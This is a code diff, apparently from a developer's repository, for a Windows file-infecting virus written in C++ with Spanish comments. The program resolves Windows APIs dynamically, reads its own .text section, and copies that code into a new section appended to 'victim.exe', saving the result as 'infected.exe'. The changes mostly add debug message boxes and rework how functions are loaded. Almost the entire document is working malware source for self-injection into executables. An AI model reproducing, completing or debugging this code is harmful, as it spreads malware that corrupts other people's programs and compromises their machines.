@@ -21,8 +21,9 @@ __declspec(allocate(".text"))
 #ifndef CUSTOM_ALIGN_UP
 #define CUSTOM_ALIGN_UP(value, alignment) (((value) + ((alignment) - 1)) & ~((alignment) - 1))
 #endif
-
 char load_lib_str[] = "LoadLibraryA";
+
+
 // Stack based strings for libraries and functions the shellcode needs
 wchar_t kernel32_dll_name[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };
 char load_lib_name[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
@@ -79,15 +80,12 @@ HANDLE(WINAPI* _CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwS
 BOOL(WINAPI* _WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
 void* (WINAPI* _memset)(void* dest, int value, size_t num);
 BOOL(WINAPI* _FlushViewOfFile)(LPCVOID lpBaseAddress, SIZE_T dwNumberOfBytesToFlush);
-
-void (WINAPI* _ExitProcess)(UINT uExitCode);
-LPVOID(WINAPI* _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
+LPVOID(WINAPI* _VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 BOOL(WINAPI* _VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
-int (CDECL* _strcmp)(const char* str1, const char* str2);
-void(WINAPI* _MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
-// Declarar las funciones globales adicionales
-errno_t(CDECL* _strncpy_s)(char* dest, size_t destsz, const char* src, size_t count);
-void(WINAPI* _CopyMemory)(PVOID Destination, const PVOID Source, SIZE_T Length);
+VOID(WINAPI* _ExitProcess)(UINT uExitCode);
+int(__cdecl* _strcmp)(const char* str1, const char* str2);
+errno_t(__cdecl* _strncpy_s)(char* dest, size_t destSize, const char* src, size_t count);
+void(WINAPI* _CopyMemory)(PVOID dest, const VOID* src, SIZE_T count);
 
 // Función para inicializar las funciones globales
 bool InitializeFunctions() {
@@ -101,7 +99,7 @@ bool InitializeFunctions() {
     HMODULE k32_dll = _LoadLibraryA(kr32_dll_name);
     HMODULE u32_dll = _LoadLibraryA(user32_dll_name);
     HMODULE hLibC = _LoadLibraryA(ucrtbase_dll_name);
-
+    HMODULE hMsvcrt = _LoadLibraryA("msvcrt.dll");
     if (!k32_dll || !u32_dll || !hLibC) return false;
     _CreateFileA = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)) _GetProcAddress(k32_dll, "CreateFileA");
     _GetFileSize = (DWORD(WINAPI*)(HANDLE, LPDWORD)) _GetProcAddress(k32_dll, get_file_size_name);
@@ -124,28 +122,37 @@ bool InitializeFunctions() {
     // Inicializar WriteFile, FlushViewOfFile y memset
     _WriteFile = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)) _GetProcAddress(k32_dll, "WriteFile");
     _FlushViewOfFile = (BOOL(WINAPI*)(LPCVOID, SIZE_T)) _GetProcAddress(k32_dll, "FlushViewOfFile");
-    _memset = (void* (WINAPI*)(void*, int, size_t)) _GetProcAddress(hLibC, "memset");
+    _memset = (void* (WINAPI*)(void*, int, size_t))_GetProcAddress(hLibC, "memset");
+    _VirtualAlloc = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD)) _GetProcAddress(k32_dll, "VirtualAlloc");
+    _VirtualFree = (BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD)) _GetProcAddress(k32_dll, "VirtualFree");
+    _ExitProcess = (VOID(WINAPI*)(UINT))_GetProcAddress(k32_dll, "ExitProcess");
+    _CopyMemory = (void(WINAPI*)(PVOID, const VOID*, SIZE_T))_GetProcAddress(k32_dll, "RtlCopyMemory");
+    _strcmp = (int(__cdecl*)(const char*, const char*))_GetProcAddress(hMsvcrt, "strcmp");
+    _strncpy_s = (errno_t(__cdecl*)(char*, size_t, const char*, size_t))_GetProcAddress(hMsvcrt, "strncpy_s");
 
-    // Inicializar las funciones adicionales
-    _strncpy_s = (errno_t(CDECL*)(char*, size_t, const char*, size_t)) _GetProcAddress(hLibC, "strncpy_s");
-    _CopyMemory = (void(WINAPI*)(PVOID, const PVOID, SIZE_T)) _GetProcAddress(k32_dll, "RtlCopyMemory");
-
-    return true;
+    return _GetFileSize && _MapViewOfFile && _UnmapViewOfFile && _CreateFileMappingA && _ReadFile && _MessageBoxW &&
+        _MultiByteToWideChar && _CloseHandle && _strncmp && _strcpy_s && _ZeroMemory && _SetFilePointer &&
+        _SetEndOfFile && _malloc && _memcpy && _CreateFileA && _WriteFile && _FlushViewOfFile && _memset && _VirtualAlloc && _VirtualFree && _ExitProcess && _CopyMemory && _strcmp && _strncpy_s;
 }
+
 void PrintError(const char* message) {
-    _MessageBoxA(NULL, message, "Error", MB_ICONERROR);
+    wchar_t wbuffer[64];
+    _MultiByteToWideChar(CP_ACP, 0, message, -1, wbuffer, 64);
+    _MessageBoxW(NULL, wbuffer, L"Error", MB_ICONERROR);
     _ExitProcess(EXIT_FAILURE);
 }
 
 DWORD GetTextSectionRVA(const char* filePath, DWORD& textSectionSize) {
+    _MessageBoxW(NULL, L"_CreateFileA", L"Error", MB_OK);
     HANDLE hFile = _CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         PrintError("Cannot open file");
     }
-
+    _MessageBoxW(NULL, L"_GetFileSize", L"Error", MB_OK);
     DWORD fileSize = _GetFileSize(hFile, NULL);
     char* fileData = (char*)_VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
     DWORD bytesRead;
+    _MessageBoxW(NULL, L"_ReadFile", L"Error", MB_OK);
     if (!_ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
         PrintError("Error reading file");
     }
@@ -153,7 +160,7 @@ DWORD GetTextSectionRVA(const char* filePath, DWORD& textSectionSize) {
     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileData;
     IMAGE_NT_HEADERS64* ntHeaders = (IMAGE_NT_HEADERS64*)(fileData + dosHeader->e_lfanew);
     IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)(fileData + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64));
-
+    _MessageBoxW(NULL, L"NumberOfSections", L"Error", MB_OK);
     DWORD rva = 0;
     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
         if (_strcmp((char*)sections[i].Name, ".text") == 0) {
@@ -162,21 +169,25 @@ DWORD GetTextSectionRVA(const char* filePath, DWORD& textSectionSize) {
             break;
         }
     }
-
+    _MessageBoxW(NULL, L"_VirtualFree", L"Error", MB_OK);
     _VirtualFree(fileData, 0, MEM_RELEASE);
+    _MessageBoxW(NULL, L"_CloseHandle", L"Error", MB_OK);
     _CloseHandle(hFile);
     return rva;
 }
 
 void InjectSelf(const char* victimFilePath, const char* outputFilePath, const char* selfCode, size_t selfCodeSize) {
+    _MessageBoxW(NULL, L"_CreateFileA", L"Error", MB_OK);
     HANDLE hFile = _CreateFileA(victimFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         PrintError("Cannot open victim file");
     }
-
+    _MessageBoxW(NULL, L"_GetFileSize", L"Error", MB_OK);
     DWORD fileSize = _GetFileSize(hFile, NULL);
+    _MessageBoxW(NULL, L"_VirtualAlloc", L"Error", MB_OK);
     char* fileData = (char*)_VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
     DWORD bytesRead;
+    _MessageBoxW(NULL, L"_ReadFile", L"Error", MB_OK);
     if (!_ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
         PrintError("Error reading PE file");
     }
@@ -193,6 +204,7 @@ void InjectSelf(const char* victimFilePath, const char* outputFilePath, const ch
     DWORD newSectionPointerToRawData = lastSection.PointerToRawData + ((lastSection.SizeOfRawData + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));
 
     size_t newFileSize = newSectionPointerToRawData + ((selfCodeSize + optionalHeader.FileAlignment - 1) & ~(optionalHeader.FileAlignment - 1));
+    _MessageBoxW(NULL,L"_VirtualAlloc", L"Error", MB_OK);
     fileData = (char*)_VirtualAlloc(fileData, newFileSize, MEM_COMMIT, PAGE_READWRITE);
 
     IMAGE_SECTION_HEADER newSection = {};
@@ -217,7 +229,7 @@ void InjectSelf(const char* victimFilePath, const char* outputFilePath, const ch
 
     _CopyMemory(fileData + dosHeader->e_lfanew, ntHeaders, sizeof(IMAGE_NT_HEADERS64));
     _CopyMemory(fileData, dosHeader, sizeof(IMAGE_DOS_HEADER));
-
+    _MessageBoxW(NULL, L"_CreateFileA(outputFilePath)", L"Error", MB_OK);
     HANDLE hOutFile = _CreateFileA(outputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hOutFile == INVALID_HANDLE_VALUE) {
         PrintError("Cannot open output file");
@@ -233,7 +245,9 @@ void InjectSelf(const char* victimFilePath, const char* outputFilePath, const ch
 }
 
 int main(int argc, char* argv[]) {
+   
     InitializeFunctions();
+    _MessageBoxW(NULL, L"ALL", L"Error", MB_OK);
     const char* victimFilePath = "victim.exe"; // Cambiar por el archivo de víctima
     const char* outputFilePath = "infected.exe"; // Cambiar por el archivo de salida
 
@@ -241,23 +255,27 @@ int main(int argc, char* argv[]) {
     //_GetModuleFileNameA(NULL, selfPath, MAX_PATH);
 
     DWORD textSectionSize = 0;
+    _MessageBoxW(NULL, L"GetTextSectionRVA", L"Error", MB_OK);
     DWORD textSectionOffset = GetTextSectionRVA(selfPath, textSectionSize);
-
-    HANDLE hSelfFile = CreateFileA(selfPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    _MessageBoxW(NULL, L"_CreateFileA", L"Error", MB_OK);
+    HANDLE hSelfFile = _CreateFileA(selfPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hSelfFile == INVALID_HANDLE_VALUE) {
         PrintError("Cannot open self file");
     }
-
+    _MessageBoxW(NULL, L"_VirtualAlloc", L"Error", MB_OK);
     char* selfCode = (char*)_VirtualAlloc(NULL, textSectionSize, MEM_COMMIT, PAGE_READWRITE);
     DWORD bytesRead;
+    _MessageBoxW(NULL, L"_SetFilePointer", L"Error", MB_OK);
     _SetFilePointer(hSelfFile, textSectionOffset, NULL, FILE_BEGIN);
+    _MessageBoxW(NULL, L"_ReadFile", L"Error", MB_OK);
     if (!_ReadFile(hSelfFile, selfCode, textSectionSize, &bytesRead, NULL)) {
         PrintError("Error reading self code");
     }
-
+    _MessageBoxW(NULL, L"InjectSelf", L"Error", MB_OK);
     InjectSelf(victimFilePath, outputFilePath, selfCode, textSectionSize);
-
+    _MessageBoxW(NULL, L"_VirtualFree", L"Error", MB_OK);
     _VirtualFree(selfCode, 0, MEM_RELEASE);
+    _MessageBoxW(NULL, L"_CloseHandle", L"Error", MB_OK);
     _CloseHandle(hSelfFile);
 
     return 0;
